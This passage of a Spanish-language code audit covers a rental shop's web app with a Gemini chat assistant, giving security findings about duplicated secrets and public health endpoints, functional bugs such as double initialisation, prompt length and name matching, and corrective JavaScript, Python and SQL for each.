- `keyGenerator` usa `req.usuario.id` porque `autenticar` ya se ejecuta antes en la cadena (`backend/routes/index.js:44`: `autenticar, iaRateLimiter`), así que `req.usuario` está poblado. El fallback por IP cubre el caso de que alguien reordene los middlewares.
- Se elimina el `skip` de las líneas 13-16: el middleware se monta **exclusivamente** en `/ia/chat` (`routes/index.js:44`), nunca de forma global, así que la condición siempre es `false` y solo hace creer que el middleware es global (ver CAL-08).
- `standardHeaders: 'draft-7'` habilita `RateLimit` y `Retry-After`, necesarios para UX-03.

---

### SEC-08 — Secretos reales en archivos de trabajo, duplicados donde no se usan, y `.env.example` desactualizado
**Severidad: BAJO** *(por exposición actual; la acción recomendada es rotar la clave de todos modos)*

**Archivos y líneas**
- `python-ia/.env:9` — `API_GEMINI_KEY=AQ.Ab8RN6L…` (clave real).
- `python-ia/.env:6` y `backend/.env:6` — `DB_PASSWORD=123456789`.
- `backend/.env:7` — `JWT_SECRET` real.
- `backend/.env:13` — **la misma** `API_GEMINI_KEY` duplicada en el `.env` de Node, donde **nunca se lee** (`grep -rn "GEMINI\|API_GEMINI" --include=*.js backend/` → 0 resultados).
- `backend/.env.example:1-11` — le faltan `PYTHON_IA_URL`, `RATE_LIMIT_IA` y `IA_SERVICE_TOKEN`, e incluye `API_GEMINI_KEY` (que Node no usa).

**Descripción**
Lo bueno primero: **los `.env` reales nunca se han subido a git.** Se verificó el historial completo (`git log --all --diff-filter=A --name-only | grep -i "\.env"`) y el único archivo `.env*` que aparece es `backend/.env.example`. El `.gitignore` los cubre, incluso con reglas redundantes (`.gitignore:1,4,5,6,7`).

Lo que queda por corregir:
1. **La clave de Gemini está duplicada en `backend/.env:13` sin ningún consumidor.** Duplica la superficie de exposición (dos archivos que pueden acabar en una captura, un `cat`, un screen share o un ZIP de entrega) a cambio de cero beneficio funcional.
2. **`DB_PASSWORD=123456789`** es una contraseña trivial. Fuera de un entorno local es inaceptable; conviene dejarlo escrito para que no se replique en el despliegue.
3. **`backend/.env.example` está desactualizado.** Quien clone el repo y copie el ejemplo obtendrá un `.env` sin `PYTHON_IA_URL` ni `RATE_LIMIT_IA`, y con una `API_GEMINI_KEY` inútil. El servicio arrancará y el chat fallará por configuración incompleta.

**Escenario concreto donde falla**
Durante la presentación se comparte pantalla y se abre `backend/.env` o `python-ia/.env` para explicar la configuración (es lo natural al enseñar cómo se integra Gemini). La clave de la API queda grabada en la sesión o en las fotos del público. Con esa clave, cualquiera consume la cuota del proyecto en su propio nombre y genera cargos o el corte del servicio. El mismo riesgo aplica si el proyecto se entrega como ZIP (los `.env` no están en git, pero **sí** en el directorio).

**Corrección propuesta**

1. **Rotar `API_GEMINI_KEY`** en <https://aistudio.google.com/apikey> (revocar la actual, generar una nueva) y poner la nueva **solo** en `python-ia/.env`.
2. Eliminar de `backend/.env` las tres variables que Node no lee: `API_GEMINI_KEY` (línea 13), `GEMINI_MODEL` (línea 14) y `GROQ_API_KEY` (línea 17). El contenido final de ambos archivos está en **CAL-03**.
3. Actualizar `backend/.env.example` con el contenido completo (también en CAL-03).
4. Cambiar `DB_PASSWORD` por algo no trivial, al menos en cualquier entorno que no sea el portátil de desarrollo.

---

### SEC-09 — Los endpoints de salud son públicos y revelan el modelo en uso
**Severidad: BAJO**

**Archivos y líneas**
- `backend/routes/index.js:102` — `router.get('/ia/health', async (req, res) => {…})` sin `autenticar` (compárese con todas las demás rutas, p. ej. `:120`, `:123`, `:124`).
- `python-ia/main.py:241-248` — `GET /health` devuelve `{"status", "timestamp", "model": GEMINI_MODEL}`.

**Descripción**
`GET /api/ia/health` es accesible sin token y llama a `verificarIA()` (`iaService.js:63-71`), que consulta el microservicio. `GET /health` del microservicio devuelve además el identificador exacto del modelo.

**Escenario concreto donde falla**
Un atacante sondea `GET /api/ia/health` sin credenciales para saber, en tiempo real y sin ruido, si el microservicio está arriba — útil para elegir el momento de un ataque de agotamiento de cuota, o simplemente para confirmar que existe un componente de IA que atacar. Y con acceso al puerto 8000, `GET /health` le dice qué modelo se usa (`gemini-3.6-flash`), lo que permite estimar límites de cuota y coste por token. En una red compartida, además, el endpoint es un canal gratuito para monitorizar la disponibilidad de la infraestructura ajena.

**Corrección propuesta**

Exigir autenticación en el health de Node (reemplazar `backend/routes/index.js:102`):

```javascript
router.get('/ia/health', autenticar, async (req, res) => {
```

Y no revelar el modelo en el health del microservicio (reemplazar `python-ia/main.py:241-248`):

```python
@app.get("/health")
def health() -> Dict[str, str]:
    """Health check del servicio. No expone el modelo: eso es informacion interna."""
    return {
        "status": "ok",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
```

`verificarIA()` solo lee `response.data.status` (`iaService.js:66`), así que quitar `model` no rompe nada. Si se quiere seguir viendo el modelo al arrancar, ya se imprime en el log (`main.py:61` y `main.py:317`).

---

## 3. Bugs funcionales

### BUG-01 — `ia-integration.js` se inicializa dos veces: botón duplicado y cada auto-recomendación se dispara por duplicado
**Severidad: ALTO**

**Archivos y líneas**
- `backend/frontend/assets/js/ia-integration.js:14-30` — el `init()`.
- `:15-20` — el `setInterval` que, al encontrar los componentes, hace `clearInterval` y llama a `setupIntegration()`.
- `:22-29` — el `setTimeout` de 5 s que **nunca se cancela** y vuelve a llamar a `setupIntegration()` si los componentes existen (que es precisamente el caso normal).
- `:36-37` — `setupIntegration()` llama a `addRecommendationButton()` y `setupAutoRecommendations()`.
- `:45-58` — inserta un botón con `id="ai-rec-button"`.
- `:124-135` — envuelve (monkey-patch) `this.chatWidget.addMessage`.

**Descripción**
El `setTimeout` de la línea 22 se programa incondicionalmente y no se guarda su handle, así que no hay forma de cancelarlo. El `clearInterval(checkInterval)` de la línea 17 detiene el intervalo pero no el temporizador. No existe ninguna bandera de "ya inicializado".

La secuencia real en una carga normal de página:

| t | Qué pasa |
|---|---|
| 0 ms | `DOMContentLoaded` → se crean `window.chatWidget`, `window.recommendationCards` (`chatwidget.js:328-330`, `recommendationcards.js:559-561`) y `new IAIntegration()` (`ia-integration.js:170-172`). |
| 100 ms | El intervalo encuentra ambos → `clearInterval` → **`setupIntegration()` (1.ª vez)**. |
| 600 ms | El `setTimeout(…, 500)` de `addRecommendationButton` (`:41`) inserta el botón. |
| 5000 ms | El `setTimeout` de `:22` se dispara, la condición de `:24` sigue siendo verdadera → **`setupIntegration()` (2.ª vez)**. |
| 5500 ms | Se inserta un **segundo** botón con el mismo `id="ai-rec-button"`. |

Efectos:
1. **`addMessage` queda envuelto dos veces.** En la 2.ª pasada, `originalAddMessage` (`:124`) captura la versión *ya envuelta*. La cadena resultante es `wrapper2 → wrapper1 → original`, y **cada** wrapper evalúa las palabras clave y llama a `extractAndRecommend` (`:131-132`). Un mensaje del usuario que contenga "recomienda" dispara **dos** `loadRecommendations` en paralelo.
2. **Dos botones "🎯 Recomendaciones"** con `id` duplicado (HTML inválido; `getElementById` solo alcanza el primero).
3. **Se duplica el mensaje del usuario en el DOM.** `wrapper2` llama a `originalAddMessage` (que es `wrapper1`), y `wrapper1` llama al `addMessage` real: la burbuja se pinta una vez, pero el `console.log` y la detección se ejecutan dos veces. Con una tercera inicialización (páginas lentas) el efecto se multiplica.

**Escenario concreto donde falla**
Un cliente abre `catalogo.html`, espera más de 5 segundos (lo normal: mira el catálogo antes de abrir el chat) y escribe:

> «recomienda menaje para 80 invitados»

Se disparan **tres** peticiones a `/api/ia/chat`: la del chat propiamente dicho (`chatwidget.js:135`) y **dos** de recomendaciones (`recommendationcards.js:182`, una por wrapper). Con `RATE_LIMIT_IA=5` (`backend/.env:16`), al segundo mensaje de ese estilo se llega a 6 peticiones en la misma ventana de un minuto y el backend responde `429 Demasiadas solicitudes. Intenta de nuevo en 1 minuto.` El chat queda muerto durante un minuto en plena demo. Además las dos peticiones de recomendaciones concurrentes escriben en `this.recommendations` (`recommendationcards.js:129`) sin ninguna coordinación: gana la última en responder, así que el grid puede acabar mostrando el resultado de la petición que el usuario no ve reflejada en el resumen.

**Corrección propuesta**

Reemplazar `ia-integration.js:8-30` (constructor y `init`) por:

```javascript
class IAIntegration {
    constructor() {
        this.chatWidget = null;
        this.recommendationCards = null;
        this.integrado = false;   // evita una segunda inicializacion
        this.checkInterval = null;
        this.timeoutId = null;
        this.init();
    }

    init() {
        this.checkInterval = setInterval(() => {
            if (window.chatWidget && window.recommendationCards) {
                this.setupIntegration();
            }
        }, 100);

        // Red de seguridad: si a los 5s no se logro, se avisa y se deja de intentar.
        this.timeoutId = setTimeout(() => {
            clearInterval(this.checkInterval);
            if (!this.integrado) {
                console.warn('IA Integration: Componentes no cargados a tiempo');
            }
        }, 5000);
    }

    setupIntegration() {
        // setupIntegration() envuelve addMessage e inserta un boton: ejecutarlo dos
        // veces duplicaria ambos (dos peticiones por cada auto-recomendacion).
        if (this.integrado) return;
        this.integrado = true;
        clearInterval(this.checkInterval);
        clearTimeout(this.timeoutId);

        console.log('✅ IA Integration iniciado');
        this.chatWidget = window.chatWidget;
        this.recommendationCards = window.recommendationCards;
        this.addRecommendationButton();
        this.setupAutoRecommendations();
    }
```

Es decir: se elimina el `setupIntegration()` del `setTimeout` (ahora solo avisa y limpia), el intervalo ya no hace `clearInterval` por su cuenta (lo hace `setupIntegration`), y la bandera `integrado` hace la función idempotente aunque se la llame de nuevo por cualquier vía.

Además, como defensa frente a un botón duplicado por cualquier otro motivo, reemplazar `ia-integration.js:42-44`:

```javascript
            const chatContainer = document.getElementById('chat-container');
            if (!chatContainer) return;
            if (document.getElementById('ai-rec-button')) return; // ya insertado
```

---

### BUG-02 — El límite de 6000 caracteres es un parche proporcional al catálogo actual: se rompe a partir de ~70 productos
**Severidad: ALTO** *(latente: hoy no falla, fallará de forma total y silenciosa al crecer el catálogo)*

**Archivos y líneas**
- `backend/routes/index.js:64-69` — la validación: `if (mensaje.length > 6000) return res.status(400).json({… 'El mensaje es muy largo (máximo 6000 caracteres)'})`.
- `backend/frontend/assets/js/recommendationcards.js:163-180` — `pedirRecomendacionesIA` construye el mensaje metiendo **todo** el catálogo.
- `:164-166` — el listado: una línea por producto, `` `- ${p.nombre} (categoría: ${p.categoria}, S/ ${p.precio_unidad} c/u, stock: ${p.stock_disponible})` ``.
- `:148-157` — `fetchCatalogo()` pide `/api/productos/catalogo` sin ningún parámetro de paginación ni límite.
- `backend/controllers/productosController.js:7-29` — `getCatalogo` **no tiene `LIMIT`**: devuelve todos los productos con `activo = true`.

**Descripción**
El "mensaje" de la petición de recomendaciones no es texto escrito por una persona: es un prompt generado que contiene el catálogo completo serializado. Su longitud es una función lineal del número de productos activos, un dato de negocio que solo crece. Validar ese prompt con el mismo límite de caracteres que un mensaje de chat libre es la raíz del problema: el commit `bddc56b` ("aumentar límite de mensaje") subió el techo, pero el techo sigue siendo fijo mientras el contenido crece.

**Medición real sobre este repositorio** (productos de `database/schema.sql:215-230` y `:236-246` más `database/seed_demo.sql:14-33`):

| Magnitud | Valor |
|---|---|
| Productos sembrados | 28 |
| Plantilla del prompt (texto fijo de `:172-180`) | 563 caracteres |
| Listado de catálogo | 2 184 caracteres |
| **Mensaje total actual** | **2 747 caracteres** (46 % del límite) |
| Media por producto | 78,0 caracteres |
| **Productos a los que se supera 6000** | **~70** |

Es decir: el margen actual es de unos 42 productos. Duplicar el catálogo —algo perfectamente normal en un negocio de alquiler de menaje con varias líneas temáticas— agota el límite.

**Escenario concreto donde falla**
El dueño carga el inventario completo de la empresa a lo largo de la temporada y pasa de 28 a 75 productos activos. Desde ese momento, **todas** las peticiones de recomendaciones fallan: `fetchCatalogo` trae 75 productos, el prompt pasa de 6000 caracteres y `/api/ia/chat` devuelve `400 {"success": false, "error": "El mensaje es muy largo (máximo 6000 caracteres)"}`. En el navegador, `pedirRecomendacionesIA` lanza ese texto (`:197-199`), `loadRecommendations` lo captura (`:137-139`) y el usuario ve una alerta que dice *"El mensaje es muy largo (máximo 6000 caracteres)"* — un mensaje incomprensible, porque el usuario no escribió ningún mensaje: solo rellenó un formulario con "boda / 120 asistentes". Nada indica que la causa sea el tamaño del catálogo, y el chat conversacional sigue funcionando con normalidad, lo que hace el diagnóstico aún más confuso. El fallo es total (0 % de recomendaciones) y permanente hasta que alguien desactive productos.

**Corrección propuesta**

Tres cambios complementarios. El (a) es el que elimina la dependencia del tamaño del catálogo; (b) y (c) son la red de seguridad.

**(a) Acotar el catálogo que entra al prompt, con reparto por categoría.** Así el prompt tiene longitud acotada y sigue habiendo variedad de categorías (vajilla, copas, cubiertos, manteles) para que el modelo pueda armar un juego completo. En `recommendationcards.js`, añadir un método a la clase (por ejemplo antes de `pedirRecomendacionesIA`, es decir antes de la línea 163):

```javascript
    /**
     * El prompt de recomendaciones incluye el catalogo serializado, asi que su
     * longitud crece con el numero de productos. Se acota a MAX_PRODUCTOS_PROMPT
     * repartiendo el cupo por categoria (round-robin) para no dejar fuera familias
     * enteras: sin esto, un catalogo grande hace que el prompt supere el limite de
     * /api/ia/chat y las recomendaciones dejan de funcionar por completo.
     */
    acotarCatalogoParaPrompt(catalogo, maxProductos = RecommendationCards.MAX_PRODUCTOS_PROMPT) {
        if (catalogo.length <= maxProductos) return catalogo;

        const porCategoria = new Map();
        for (const p of catalogo) {
            const clave = p.categoria || 'Otro';
            if (!porCategoria.has(clave)) porCategoria.set(clave, []);
            porCategoria.get(clave).push(p);
        }

        // Dentro de cada categoria, primero los de mas stock (mas utiles para eventos grandes).
        for (const lista of porCategoria.values()) {
            lista.sort((a, b) => Number(b.stock_disponible) - Number(a.stock_disponible));
        }

        const seleccion = [];
        const colas = [...porCategoria.values()];
        let quedan = true;
        while (seleccion.length < maxProductos && quedan) {
            quedan = false;
            for (const cola of colas) {
                if (!cola.length) continue;
                seleccion.push(cola.shift());
                quedan = true;
                if (seleccion.length >= maxProductos) break;
            }
        }
        return seleccion;
    }
```

Y declarar la constante junto a la clase (tras la línea 556, después del cierre de la clase):

```javascript
// 40 productos x ~78 caracteres por linea + ~600 de plantilla = ~3.7k caracteres,
// holgadamente por debajo del limite de /api/ia/chat y del presupuesto de tokens.
RecommendationCards.MAX_PRODUCTOS_PROMPT = 40;
```

Modificar `pedirRecomendacionesIA` para usarlo (reemplazar `recommendationcards.js:163-166`):

```javascript
    async pedirRecomendacionesIA(tipoEvento, numAsistentes, presupuesto, catalogo) {
        const catalogoAcotado = this.acotarCatalogoParaPrompt(catalogo);
        if (catalogoAcotado.length < catalogo.length) {
            console.info(
                `Catálogo acotado para el prompt: ${catalogoAcotado.length} de ${catalogo.length} productos`
            );
        }

        const listado = catalogoAcotado
            .map(p => `- ${p.nombre} (categoría: ${p.categoria}, S/ ${p.precio_unidad} c/u, stock: ${p.stock_disponible})`)
            .join('\n');
```

**Importante:** `resolverContraCatalogo` (`:227`) debe seguir recibiendo el catálogo **completo**, no el acotado, para que la validación anti-alucinación no rechace un producto real. En `loadRecommendations:127-129` ya se pasa `catalogo` (el completo) a ambos, así que no hay que cambiar nada ahí — solo hay que no confundirlos al aplicar el parche.

**(b) Hacer configurable el límite del servidor y dejar por escrito qué lo determina.** Reemplazar `backend/routes/index.js:64-69`:

```javascript
        // El mensaje de recomendaciones es un prompt generado que incluye el catalogo
        // (frontend/assets/js/recommendationcards.js), acotado a 40 productos: ~4k caracteres.
        // MENSAJE_IA_MAX_CHARS permite subirlo sin tocar codigo si el prompt crece.
        const MENSAJE_MAX = Number.parseInt(process.env.MENSAJE_IA_MAX_CHARS ?? '', 10) || 8000;
        if (mensaje.length > MENSAJE_MAX) {
            return res.status(400).json({
                success: false,
                error: `El mensaje es muy largo (máximo ${MENSAJE_MAX} caracteres)`
            });
        }
```

**(c) Un `LIMIT` de seguridad en el catálogo.** Evita que un catálogo enorme sature la respuesta HTTP y el navegador. Reemplazar `backend/controllers/productosController.js:26`:

```javascript
    sql += ' ORDER BY p.nombre LIMIT 500';
```

---

### BUG-03 — La validación anti-alucinación exige coincidencia exacta de nombre: una tilde descarta un producto válido
**Severidad: ALTO**

**Archivos y líneas**
- `backend/frontend/assets/js/recommendationcards.js:234` — `const nombreBuscado = String(item.nombre || '').trim().toLowerCase();`
- `backend/frontend/assets/js/recommendationcards.js:235` — `const producto = catalogo.find(p => p.nombre.trim().toLowerCase() === nombreBuscado);`
- `backend/frontend/assets/js/recommendationcards.js:236` — `if (!producto) continue; // descarta lo que la IA haya inventado`
- `backend/frontend/assets/js/recommendationcards.js:131-135` — qué pasa cuando no queda ninguno.

**Descripción**
La normalización aplicada es únicamente `trim()` + `toLowerCase()`. La comparación es de igualdad estricta de cadenas. Eso significa que el filtro anti-alucinación —que es correcto en su intención: garantizar que `id`, `precio` y `stock` salgan de la base de datos y no del modelo— descarta también los aciertos del modelo cuando la grafía no coincide carácter a carácter.

Los LLM reescriben nombres con total naturalidad. Casos que hoy **fallan** contra el catálogo real de este repositorio:

| Nombre en el catálogo | Lo que puede devolver el modelo | ¿Coincide? |
|---|---|---|
| `Plato de Sitio Vidrio Bordes Dorados` | `Plato de Sitio de Vidrio Bordes Dorados` (añade "de") | ❌ |
| `Copa Flauta Premium para Champagne` | `Copa Flauta Premium para Champán` | ❌ |
| `Vaso Alto Validus 12oz` | `Vaso Alto Validus 12 oz` (espacio) | ❌ |
| `Camino de Mesa Yute Rústico` | `Camino de Mesa Yute Rustico` (sin tilde) | ❌ |
| `Mantel Rectangular Blanco Jacquard` | `Mantel  Rectangular Blanco Jacquard` (doble espacio) | ❌ |
| `Cubeta de Hielo Acero Inoxidable` | `Cubeta de Hielo (Acero Inoxidable)` | ❌ |
| `Servilletero de Metal` | `Servilletero de Metal.` (punto final) | ❌ |

Nótese que la tilde es especialmente traicionera porque puede diferir incluso siendo visualmente idéntica: `ú` puede venir como un solo carácter (U+00FA, forma NFC) o como `u` + acento combinante (U+0075 U+0301, forma NFD). `===` los considera distintos y en pantalla se ven igual, así que el bug es invisible al depurar a ojo.

**Escenario concreto donde falla**
Un cliente pide recomendaciones para «boda / 150 asistentes». Gemini elige correctamente 6 productos reales del listado, pero escribe tres de ellos con variaciones ortográficas (añade "de", quita una tilde, normaliza "12oz" a "12 oz"). `resolverContraCatalogo` descarta esos tres en el `continue` de la línea 236 y `this.recommendations` queda con 3 elementos: el cliente ve **la mitad** de la propuesta, sin vajilla completa, y no hay ningún aviso de que se descartó nada. En el caso peor —el modelo reescribe el estilo de todos los nombres, por ejemplo poniéndolos en Título o añadiendo la categoría entre paréntesis— se descartan los 6, `this.recommendations` queda vacío y se cae en UX-01: grid vacío sin explicación.

**Corrección propuesta**

Normalización agresiva (Unicode NFD + eliminación de diacríticos + colapso de espacios + eliminación de puntuación) y, si aun así no hay coincidencia exacta normalizada, una coincidencia por inclusión **solo cuando es inequívoca** (un único candidato). Nada de esto requiere embeddings ni búsqueda semántica: es comparación de cadenas, plenamente dentro de OPCIÓN 1.

Añadir dos métodos a la clase `RecommendationCards` (antes de `resolverContraCatalogo`, es decir antes de la línea 227):

```javascript
    /**
     * Normaliza un nombre de producto para comparar: quita tildes (incluidas las
     * escritas en forma NFD, que se ven igual pero no son === a la forma NFC),
     * signos de puntuacion y espacios repetidos. Sin esto, una sola tilde de
     * diferencia en la respuesta del modelo descarta un producto real del catalogo.
     */
    normalizarNombre(valor) {
        return String(valor ?? '')
            .normalize('NFD')
            .replace(/[̀-ͯ]/g, '')   // diacriticos combinantes
            .toLowerCase()
            .replace(/[^a-z0-9]+/g, ' ')       // puntuacion, parentesis, guiones -> espacio
            .trim()
            .replace(/\s+/g, ' ');
    }

    /**
     * Resuelve el nombre devuelto por el modelo contra el catalogo real en tres
     * pasadas, de la mas estricta a la mas laxa. La ultima solo acepta el resultado
     * si es UNICO: con dos candidatos se descarta, para no atribuirle al cliente un
     * producto (y un precio) que el modelo no eligio.
     */
    buscarProductoEnCatalogo(nombreIA, catalogo) {
        const objetivo = this.normalizarNombre(nombreIA);
        if (!objetivo) return null;

        // 1. Coincidencia exacta normalizada.
        const exacto = catalogo.find(p => this.normalizarNombre(p.nombre) === objetivo);
        if (exacto) return exacto;

        // 2. El nombre del catalogo contiene el del modelo, o al contrario
        //    ("Plato de Sitio de Vidrio..." vs "Plato de Sitio Vidrio...").
        const contenidos = catalogo.filter(p => {
            const n = this.normalizarNombre(p.nombre);
            return n.includes(objetivo) || objetivo.includes(n);
        });
        if (contenidos.length === 1) return contenidos[0];

        // 3. Coincidencia por palabras: todas las palabras significativas del nombre
        //    del catalogo aparecen en el del modelo (y viceversa para el caso corto).
        const palabras = objetivo.split(' ').filter(w => w.length > 2);
        if (palabras.length) {
            const porPalabras = catalogo.filter(p => {
                const n = this.normalizarNombre(p.nombre);
                const suyas = n.split(' ').filter(w => w.length > 2);
                if (!suyas.length) return false;
                const compartidas = suyas.filter(w => palabras.includes(w)).length;
                return compartidas === suyas.length || compartidas === palabras.length;
            });
            if (porPalabras.length === 1) return porPalabras[0];
        }

        return null; // sigue descartando lo que el modelo haya inventado
    }
```

Reemplazar `recommendationcards.js:232-240` para usarlo y para contar los descartes (necesario para UX-01):

```javascript
        const resueltos = [];
        const descartados = [];
        for (const item of items) {
            const producto = this.buscarProductoEnCatalogo(item.nombre, catalogo);
            if (!producto) {
                // No existe en el catalogo real: el modelo se lo invento.
                descartados.push(String(item.nombre || '(sin nombre)'));
                continue;
            }

            const cantidad = Math.max(1, parseInt(item.cantidad) || 1);
            const precio_unidad = parseFloat(producto.precio_unidad);
```

Y al final del método, reemplazar `recommendationcards.js:254` (`return resueltos;`) por:

```javascript
        // Se guarda para poder explicar al usuario cuantas sugerencias se descartaron
        // por no existir en el catalogo real (ver renderRecommendations / estado vacio).
        this.ultimosDescartados = descartados;
        if (descartados.length) {
            console.warn('Recomendaciones descartadas (no existen en el catálogo):', descartados);
        }
        return resueltos;
```

Para evitar que estos tres métodos sean código sin red de seguridad, conviene además una comprobación rápida en consola del navegador con el catálogo real, verificando que los siete casos de la tabla anterior resuelven correctamente.

---

### BUG-04 — `conversaciones_ia.estado` es siempre `'completada'`: las conversaciones fallidas no se registran
**Severidad: MEDIO**

**Archivos y líneas**
- `python-ia/main.py:212-234` — `guardar_conversacion(usuario_id, mensaje, respuesta, tokens)`: la firma no admite el estado.
- `python-ia/main.py:220-227` — el `INSERT` con el literal cableado: `VALUES (%s, %s, %s, %s, 'completada')`.
- `python-ia/main.py:297-300` — la llamada, situada en el **paso 5**, después de la llamada a Gemini.
- `python-ia/main.py:293-295` — el `except` que lanza el 502 y, por tanto, **impide** que se llegue a la línea 298.
- `database/migrations/001_conversaciones_ia_y_stock_checks.sql:18` — `estado VARCHAR(20) DEFAULT 'completada'`: la columna existe y admite otros valores, pero nadie los escribe.
- `database/migrations/001_conversaciones_ia_y_stock_checks.sql:15` — `respuesta_ia TEXT NOT NULL`: hay que darle algún valor al registrar un error.

**Descripción**
Dos problemas que se refuerzan:

1. **El estado es un literal en el SQL.** No hay ninguna ruta de código capaz de escribir `'error'`, así que la columna `estado` tiene cardinalidad 1: es una columna decorativa.
2. **En el camino de error no se guarda nada en absoluto.** `guardar_conversacion` se invoca en la línea 298, *después* del bloque `try/except` de Gemini. Si Gemini falla, el `raise HTTPException` de la línea 295 aborta la función y la línea 298 nunca se ejecuta. Lo mismo ocurre con el 404 de usuario (`main.py:132`) y con un fallo de validación (`main.py:254-257`).

Consecuencia: en la base de datos solo existen las conversaciones que salieron bien. No se puede distinguir *"no hubo ningún fallo"* de *"los fallos no se miden"*, que es exactamente la ambigüedad que un campo `estado` debería resolver. Una caída de cuota de Gemini, una clave revocada o una tanda de timeouts son completamente invisibles a nivel de datos: solo quedan en el `stdout` del proceso (`main.py:294`), que se pierde al reiniciar.

**Escenario concreto donde falla**
Durante una semana la cuota gratuita de Gemini se agota cada tarde y ~40 % de los mensajes fallan con 502. El dueño abre el reporte de uso del asistente y ve, digamos, 120 conversaciones, todas con `estado = 'completada'` y tokens contabilizados. Concluye que el asistente funciona perfectamente y que se usa poco. La realidad es que hubo ~80 fallos que ningún dato refleja, y los clientes que vieron el error no volvieron a intentarlo. Cualquier consulta del tipo `SELECT estado, COUNT(*) FROM conversaciones_ia GROUP BY estado` devuelve una sola fila, para siempre.

**Corrección propuesta**

Parametrizar el estado y registrar también los fallos. Reemplazar `python-ia/main.py:212-234` completo:

```python
def guardar_conversacion(
    usuario_id: int,
    mensaje: str,
    respuesta: str,
    tokens: int,
    estado: str = "completada",
) -> None:
    """
    Guarda el intercambio en conversaciones_ia.

    'estado' distingue las conversaciones completadas de las fallidas: sin el
    parametro, la columna solo contendria 'completada' y seria imposible saber si
    no hubo fallos o si simplemente no se estaban registrando.
    Nunca propaga excepciones: un fallo al auditar no debe romper la respuesta.
    """
    conn = None
    try:
        conn = conectar_db()
        with conn.cursor() as cur:
            cur.execute(
                """
                INSERT INTO conversaciones_ia
                    (usuario_id, mensaje_usuario, respuesta_ia, tokens_usados, estado)
                VALUES (%s, %s, %s, %s, %s)
                """,
                # respuesta_ia es NOT NULL: en caso de error se guarda la referencia
                # del incidente en lugar de la respuesta que nunca llego.
                (usuario_id, mensaje, respuesta or "", tokens, estado),
            )
        conn.commit()
        print(f"Conversacion guardada (estado={estado}) para usuario_id={usuario_id}")
    except Exception as error:
        print(f"Error guardando conversacion en BD: {error}")
    finally:
        if conn is not None:
            conn.close()
```

Y registrar el fallo en el camino de error de Gemini. El `except` ya reescrito en **SEC-03** incluye esa llamada; si SEC-03 no se aplica, el cambio mínimo sobre `python-ia/main.py:293-295` es:

```python
    except Exception as error:
        print(f"Error llamando a Gemini API: {error!r}")
        guardar_conversacion(
            request.usuario_id, request.mensaje, "[fallo al consultar Gemini]", 0, estado="error"
        )
        raise HTTPException(status_code=502, detail="El asistente no esta disponible en este momento")
```

**Opcional pero recomendado**, para que la columna tenga garantías a nivel de esquema. Nueva migración `database/migrations/002_conversaciones_ia_estado_check.sql`:

```sql
-- ============================================================
-- Migracion 002: restringir los valores de conversaciones_ia.estado
-- La columna solo debe admitir los estados que el microservicio escribe.
-- ============================================================

-- Normaliza cualquier valor previo fuera del dominio antes de anadir el CHECK.
UPDATE conversaciones_ia
   SET estado = 'completada'
 WHERE estado IS NULL OR estado NOT IN ('completada', 'error');

ALTER TABLE conversaciones_ia
  ALTER COLUMN estado SET NOT NULL,
  ADD CONSTRAINT conversaciones_ia_estado_check
    CHECK (estado IN ('completada', 'error'));

-- Consultar el ratio de fallos por dia:
--   SELECT date_trunc('day', timestamp) AS dia, estado, COUNT(*)
--     FROM conversaciones_ia GROUP BY 1, 2 ORDER BY 1 DESC;
CREATE INDEX IF NOT EXISTS idx_conversaciones_estado ON conversaciones_ia(estado);
```

---

### BUG-05 — URL cableada a `http://localhost:3000` en el widget de chat
**Severidad: MEDIO**

**Archivos y líneas**
- `backend/frontend/assets/js/chatwidget.js:17` — `this.apiUrl = 'http://localhost:3000/api/ia/chat'; // Ruta Node.js`
- `backend/frontend/assets/js/chatwidget.js:135` — donde se usa: `await fetch(this.apiUrl, {…})`.
- (Contraste) `backend/frontend/assets/js/recommendationcards.js:24-25` — el otro componente **sí** usa rutas relativas: `this.chatApiUrl = '/api/ia/chat'` y `this.catalogoApiUrl = '/api/productos/catalogo'`.

**Descripción**
El widget de chat construye una URL absoluta con host, puerto y esquema fijos, aunque el recurso está siempre en el mismo origen que sirve la página: es el propio Express quien publica el frontend (`backend/server.js:35`, `app.use(express.static(path.join(__dirname, 'frontend')))`) y la API (`server.js:38`, `app.use('/api', routes)`). La incoherencia con `recommendationcards.js` demuestra que la ruta relativa es la convención del proyecto y que esta línea es un descuido.

Además, una URL absoluta con otro origen convierte la petición en *cross-origin*, sometida al CORS de `server.js:20-24` (`origin: process.env.CORS_ORIGIN`), añadiendo un preflight y un punto de fallo que la ruta relativa evita por completo.

**Escenario concreto donde falla**
Tres situaciones, de más a menos probable:

1. **Demo desde otro equipo de la red.** El profesor o un compañero abre `http://192.168.1.50:3000/pages/cliente/catalogo.html`. La página carga, el catálogo carga (rutas relativas), el carrito funciona… y el chat no: el navegador intenta `POST http://localhost:3000/api/ia/chat`, es decir contra **la máquina del visitante**, donde no hay ningún servidor. El widget muestra `❌ Error: Failed to fetch. Por favor, intenta de nuevo.`
2. **Puerto distinto.** Basta arrancar con `PORT=8080` (`server.js:17` lo respeta) para que el chat apunte a un puerto donde no hay nada, mientras el resto de la aplicación funciona.
3. **Despliegue con HTTPS.** En `https://menaje.example.com`, el navegador bloquea la petición a `http://localhost:3000` como *mixed content* antes incluso de intentarla, y además `localhost` es el equipo del cliente.

El síntoma es siempre el mismo y desorienta: toda la aplicación funciona menos el chat, y el mensaje de error (`Failed to fetch`) no apunta a la causa.

**Corrección propuesta**

Reemplazar `backend/frontend/assets/js/chatwidget.js:17`:

```javascript
        // Ruta relativa: el backend Node sirve el frontend y la API desde el mismo
        // origen (backend/server.js:35 y :38), asi que una URL absoluta con host y
        // puerto fijos rompe el chat en cuanto se sirve desde otra IP, puerto o dominio.
        this.apiUrl = '/api/ia/chat';
```

Sin más cambios: `fetch('/api/ia/chat')` resuelve contra el origen de la página, igual que ya hace `recommendationcards.js`.

---

### BUG-06 — `GROQ_API_KEY` está declarada en los dos `.env` y no se usa en ninguna parte del código
**Severidad: MEDIO** *(configuración fantasma: no rompe nada en ejecución, pero documenta una capacidad inexistente)*

**Archivos y líneas**
- `python-ia/.env:12-13` — `# Fallback (opcional por ahora)` / `GROQ_API_KEY=opcional`
- `backend/.env:17` — `GROQ_API_KEY=opcional_por_ahora`

**Verificación**
```
$ grep -rn "GROQ" --include=*.js --include=*.py --include=*.md \
    --exclude-dir=venv --exclude-dir=node_modules .
(sin resultados)
```

